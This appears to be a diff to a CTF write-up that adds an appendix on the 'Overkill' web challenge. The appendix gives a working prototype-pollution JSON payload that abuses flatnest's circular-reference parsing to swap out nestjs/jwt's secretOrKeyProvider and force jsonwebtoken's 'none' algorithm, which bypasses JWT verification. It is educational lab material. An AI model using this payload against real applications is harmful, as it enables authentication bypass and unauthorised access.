@@ -4,7 +4,12 @@ Here is my writeup for some of the problems i find interesting or challenging fo
 
 Problems will be split by categories for better organization and navigation between problems.
 
-## List Of Problems
+## General note
+If you are reading this Writeup as PDF/any exported type, please consider visiting this original link for better experience (since codeblocks and hyperlinks can be broken/not working as intended for some file types):
+
+https://github.com/Haruna38/public-archive/blob/main/CTF-Writeups/BPCTF-recruitCTF-2024.md
+
+## Table of Contents
 - [**Web**](#web)
 	- [BP88](#bp88)
 	- [Overkill](#overkill)
@@ -12,12 +17,15 @@ Problems will be split by categories for better organization and navigation betw
 	- [bofintro](#bofintro)
 	- [canaryintro](#canaryintro)
 	- [pieintro](#pieintro)
+	- [Attack scripts for 3 challengs above](#attack-script-for-3-problems-above)
 	- [gotintro](#gotintro)
 - [**Crypto**](#crypto)
 	- [Baby Pad](#baby-pad)
 	- [Super Computer v2](#super-computer-v2)
 	- [Baby RSA 1](#baby-rsa-1)
 	- [Baby RSA 2](#baby-rsa-2)
+- [**Appendix**](#appendix)
+	- [[Web] - Overkill 2nd approach](#web-overkill---2nd-approach)
 
 ## Web
 ### BP88
@@ -321,6 +329,8 @@ Here's the demo payload for the 2nd approach if you want to learn how it works, 
 	// "__proto__.isValid": "[Circular (username.constructor)]",
 }
 ```
+
+Read [this appendix](#web-overkill---2nd-approach) if you are still confused about this payload
 ## Pwn
 **Note:** All 3 challenges (gofintro, canaryintro and pieintro) are using the same attack script but with different parameters, so on those 3 sections I will only mention the parameters and will post the code later in this section.
 
@@ -1489,3 +1499,173 @@ listen("blackpinker.rocks", 30911)
 ![Result](./images/bpctf-recruitctf-2024/crypto-babyrsa2.png)
 
 **Flag:** `BPCTF{How_many_queries_did_you_use?_0b2dac556d3a}`
+
+## Appendix
+### [Web] Overkill - 2nd approach
+**Payload:**
+```js
+{
+	"sus": "no",
+	"__proto__.secretOrKeyProvider": "[Circular (username.__lookupGetter__)]",
+	"__proto__.algorithms": ["none"],
+	"__proto__.algorithm": "none",
+	"__proto__.alg": "none",
+	// "__proto__.isValid": "[Circular (username.constructor)]",
+}
+```
+
+**Warning: This method is possible after so many trials and errors messing around with Docker localhost of the challenge instance, `jsonwebtoken`, `nestjs/jwt` and JS prototypes method knowledge, so i suggest reading the code of such libarries carefully before reading eveything below!**
+
+This approach focuses on  disabling JWT verification server-side, since there's a `None` algorithm in [list of JWT algorithms](https://github.com/auth0/node-jsonwebtoken#algorithms-supported).
+
+Normally, only `algorithm: "none"` should be enough to do the job, but since [JWT Verify function implementation](https://github.com/auth0/node-jsonwebtoken/blob/e1fa9dcc12054a8681db4e6373da1b30cf7016e3/verify.js) is very very weird (and stupid) for `None` algorithm verification, we also need to also do these approaches along with it:
+
+1. Include `algorithms: ["none"]` as list of algorithms AND `alg: "none"` (just for safety) so the code won't throw, because of this:
+
+[*jsonwebtoken/verify.js:L144*](https://github.com/auth0/node-jsonwebtoken/blob/e1fa9dcc12054a8681db4e6373da1b30cf7016e3/verify.js#L144)
+```js
+if (options.algorithms.indexOf(decodedToken.header.alg) === -1) {
+	return done(new JsonWebTokenError('invalid algorithm'));
+}
+```
+
+- Somehow pass `undefined` or `null` as secret in parameters because of these (`hasSignature` is false because `None` algorithm has no signatures):
+
+[*jsonwebtoken/verify.js:L108 - L130*](https://github.com/auth0/node-jsonwebtoken/blob/e1fa9dcc12054a8681db4e6373da1b30cf7016e3/verify.js#L144) (And here is [reason why this is stupid](https://github.com/auth0/node-jsonwebtoken/issues/185))
+```js
+if (!hasSignature && secretOrPublicKey){
+	return done(new JsonWebTokenError('jwt signature is required'));
+}
+
+if (hasSignature && !secretOrPublicKey) {
+	return done(new JsonWebTokenError('secret or public key must be provided'));
+}
+
+if (!hasSignature && !options.algorithms) {
+	return done(new JsonWebTokenError('please specify "none" in "algorithms" to verify unsigned tokens'));
+}
+
+if (secretOrPublicKey != null && !(secretOrPublicKey instanceof KeyObject)) {
+	try {
+	secretOrPublicKey = createPublicKey(secretOrPublicKey);
+	} catch (_) {
+	try {
+		secretOrPublicKey = createSecretKey(typeof secretOrPublicKey === 'string' ? Buffer.from(secretOrPublicKey) : secretOrPublicKey);
+	} catch (_) {
+		return done(new JsonWebTokenError('secretOrPublicKey is not valid key material'))
+	}
+	}
+}
+```
+
+Since secret is already defined on server, we need to somehow overwrite it with nullish values, probably `nestjs/jwt` can help?
+
+[*jwt/lib/jwt.service.ts:L178*](https://github.com/nestjs/jwt/blob/1133e904ce3dcb60bc1b6c74e385c73a6ae70e1f/lib/jwt.service.ts#L178)
+```js
+private overrideSecretFromOptions(secret: GetSecretKeyResult) {
+	if (this.options.secretOrPrivateKey) {
+		this.logger.warn(
+		`"secretOrPrivateKey" has been deprecated, please use the new explicit "secret" or use "secretOrKeyProvider" or "privateKey"/"publicKey" exclusively.`
+		);
+		secret = this.options.secretOrPrivateKey;
+	}
+
+	return secret;
+}
+
+private getSecretKey(
+	token: string | object | Buffer,
+	options: JwtVerifyOptions | JwtSignOptions,
+	key: 'publicKey' | 'privateKey',
+	secretRequestType: JwtSecretRequestType
+): GetSecretKeyResult | Promise<GetSecretKeyResult> {
+const secret = this.options.secretOrKeyProvider
+	? this.options.secretOrKeyProvider(secretRequestType, token, options)
+	: options?.secret ||
+	this.options.secret ||
+	/* some code here, i'm lazy to paste them all */;
+
+return secret instanceof Promise
+	? secret.then((sec) => this.overrideSecretFromOptions(sec))
+	: this.overrideSecretFromOptions(secret);
+}
+```
+Two things to note:
+- We can't use `secretOrPrivateKey` like the 1st approach because in this case we need to include nullish key, so it can't pass the overwrite condition
+- `getSecretKey()` here checks if `this.options.secretOrKeyProvider` exists (as a function) first and use it after all if it does --> Can overwrite this function to always return `null`/`undefined`
+
+But how to write functions in JSON?
+
+No need to, `flatnest` [supports circular reference](https://github.com/brycebaril/node-flatnest#notes) on both `nest` and `flatten` method, and here is how it will flatten (parse) it from string (as for `1.0.0`):
+
+[*flatnest/nest.js*](https://github.com/brycebaril/node-flatnest/blob/b7d97ec64a04632378db87fcf3577bd51ac3ee39/nest.js)
+```js
+module.exports = nest
+
+var seek = require("./seek")
+
+var circular = /\[Circular \((.+)\)\]/
+var nestedRe = /(\.|\[)/
+var scrub = /]/g
+
+function nest(obj) {
+  var key,
+      i,
+      nested = {}
+
+  var keys = Object.keys(obj)
+  var len = keys.length
+  for (i = 0; i < len; i++) {
+    key = keys[i]
+
+    if (typeof obj[key] == "string" && circular.test(obj[key])) {
+      var ref = circular.exec(obj[key])[1]
+      if (ref == "this")
+        obj[key] = nested
+      else
+        obj[key] = seek(nested, ref)
+    }
+    insert(nested, key, obj[key])
+  }
+
+  return nested
+}
+...
+```
+
+Here it tries to check if string value equals `[Circular (<object properties here>)]`, and will try to seek for value by iterating through every property without prototype checking (isn't that the purpose of this attack?)
+
+--> We can find a prototype function that ideally returns nullish value for most pratical cases
+
+After many tries, i find that [`Object.prototype.__lookupGetter__`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/__lookupGetter__) is the perfect candidate, so we can insert to our payload like this
+```js
+username: {
+	"sus": "no",
+	"__proto__.secretOrKeyProvider": "[Circular (username.__lookupGetter__)]",
+	// ...
+}
+```
+Why the first one? Because at first `username` is not appeared in `flatnest` lookup dictionary, so we need to make it "register" `username` for this parsing, so in this case just add any normal property and value.
+
+3. Finally, after creating a jwt token with none algorithm, please check if it ends with `.` first and appending one if not, BEFORE sending that token to server, or else you can get a `Invalid signature` error
+
+**Final payload**
+```js
+{
+	"sus": "no",
+	"__proto__.secretOrKeyProvider": "[Circular (username.__lookupGetter__)]",
+	"__proto__.algorithms": ["none"],
+	"__proto__.algorithm": "none",
+	"__proto__.alg": "none",
+	// "__proto__.isValid": "[Circular (username.constructor)]",
+}
+```
+
+**P/S:**
+
+What's this line for?
+```js
+// "__proto__.isValid": "[Circular (username.constructor)]"
+```
+
+Only use it if you tried the attack and couldn't get the flag/inject code due to 500 (Internal Server Error) because some `jsonwebtoken` version [checks every schema it passes and check if it's valid, including prototypes](https://github.com/auth0/node-jsonwebtoken/issues/945), hence can throw error if `__proto__.isValid` is missing (not a function).
